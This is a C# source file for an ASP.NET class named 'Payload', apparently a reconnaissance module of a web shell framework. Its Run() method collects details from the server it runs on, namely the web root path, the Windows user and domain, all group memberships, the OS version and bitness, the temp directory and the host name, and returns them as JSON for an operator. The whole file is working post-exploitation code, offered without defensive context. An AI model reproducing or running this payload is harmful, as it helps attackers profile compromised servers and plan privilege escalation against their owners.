using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Principal;

public class Payload
{

    [DataContract]
    class Ret
    {
        [DataMember]
        public string pwd;

        [DataMember]
        public string user;

        [DataMember]
        public string os_type;

        [DataMember]
        public string tmpdir;

        [DataMember]
        public string group;

        [DataMember]
        public string domain;

        [DataMember]
        public char sep;

        [DataMember]
        public string host;

        [DataMember]
        public int os_bits;
    }
    Ret ret;
    HttpContext context = HttpContext.Current;
    public string Run()
    {
        var ident = WindowsIdentity.GetCurrent();
        ret = new Ret();
        ret.pwd = context.Server.MapPath(".");
        string[] tmp = ident.Name.Split(System.IO.Path.DirectorySeparatorChar);
        ret.user = tmp[1];
        ret.domain = tmp[0];
        string tmp0 = "";
        IdentityReferenceCollection irc = ident.Groups;
        foreach (IdentityReference ir in irc)
            tmp0 += GetNameFromSID(ir.Value) + Path.PathSeparator;
        ret.group = tmp0;
        ret.os_type = Environment.OSVersion.VersionString;
        ret.tmpdir = Path.GetTempPath();
        ret.sep = System.IO.Path.DirectorySeparatorChar;
        ret.host = context.Server.MachineName;
        ret.os_bits = IntPtr.Size == 8?64:32;
        return Global.json_encode(ret);
    }

    string GetNameFromSID(string sid)
    {
        string name = sid;
        try
        {
            name = new SecurityIdentifier(sid).Translate(typeof(NTAccount)).ToString();
        }
        catch (Exception)
        {
            return sid;
        }
        return name;
    }
}